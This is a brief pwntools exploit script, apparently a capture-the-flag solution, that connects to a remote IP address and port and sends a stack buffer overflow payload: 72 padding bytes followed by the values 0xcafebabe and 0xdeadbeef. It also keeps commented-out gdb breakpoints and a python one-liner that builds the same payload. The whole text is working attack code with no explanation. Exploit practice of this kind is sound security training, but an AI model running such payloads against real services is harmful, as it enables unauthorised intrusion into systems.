from pwn import *




p = remote('139.59.30.165', 8800)
#p = process("./pwn2")
# gdb.attach(p,'''
# break *0x04006d7
# break *0x04006ea
# ''')
a = 0xcafebabe
b = 0xdeadbeef
print(p.recvuntil('got'))
payload = ""
payload += "A"*72
payload += p64(a)   
payload += p64(b)
p.send(payload)
p.recvall()
   

   #(python -c 'print "A"*72 + "\xbe\xba\xfe\xca"+ "\xef\xbe\xad\xde"')



